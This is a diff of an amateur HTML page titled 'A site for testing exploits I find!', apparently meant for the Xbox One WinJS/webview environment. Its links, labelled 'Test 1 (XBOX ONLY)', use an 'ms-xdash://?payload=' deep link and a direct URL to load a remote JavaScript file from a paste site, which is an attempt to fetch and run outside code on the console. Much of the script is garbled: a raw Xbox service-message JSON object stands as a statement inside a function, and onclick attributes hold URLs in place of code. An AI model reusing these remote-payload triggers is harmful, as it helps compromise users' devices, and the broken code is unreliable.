@@ -1,1 +1,24 @@
-<br><a href="https://localhost/payload.js&state=%22%22&webview=false" ;>Test 1 (XBOX ONLY)</a><br>
+<!-- PAGE_LOAD -->
+<!-- WinJS references -->
+<link href="/WinJS/css/ui-dark.css" rel="stylesheet" />
+<script src="/WinJS/js/base.min.js"></script>
+<script src="/WinJS/js/ui.min.js"></script>
+<!-- WinJS references -->
+<body onload="runwin()"></body>
+<script>
+  function runwin() {
+     "use strict";
+     {"messagetype": "Xbox/Service", "content": "{\"message\":\"Your toast is done\",\"actions\":[{\"id\":0,\"vuiGui\":\"Your Toast is Done\",\"vuiAlm\":null,\"vuiPron\":null,\"vuiConf\":null,\"launch\":\"*\",\"launchType\":\"DeepLink\"},{\"id\":1,\"vuiGui\":\"Your toast is done\",\"vuiAlm\":null,\"vuiPron\":null,\"vuiConf\":null,\"launch\":\"*\",\"launchType\":\"DeepLink\"}]}", "clientmessageid": "*", "from": "https://bn2-client-s.gateway.messenger.live.com/v1/users/xuid(*)/contacts/28:xbox_service_message", "conversationLink": "https://bn2-client-s.gateway.messenger.live.com/v1/users/xuid(*)/conversations/28:xbox_service_message", "conversationid": "28:xbox_service_message"}
+     WinJS.UI.processAll();
+  }
+</script>
+
+<!-- Start Of File -->
+<strong>A site for testing exploits I find!</strong>
+<button id="btn_submit" data-win-control="WinJS.UI.Tooltip" data-win-options="{innerHTML: 'TestButton'}"></button>
+<!-- XOne Exploits -->
+<br><a type="text/javascript" onclick="ms-xdash://?payload=https://mystb.in/raw/BodiesMallSurrounded.javascript" ;>Test 1 (XBOX ONLY)</a><br>
+
+
+<!-- Other Exploits -->
+<br><a type="text/javascript" onclick="https://mystb.in/raw/BodiesMallSurrounded.javascript" ;>Test 1 (XBOX ONLY)</a><br>
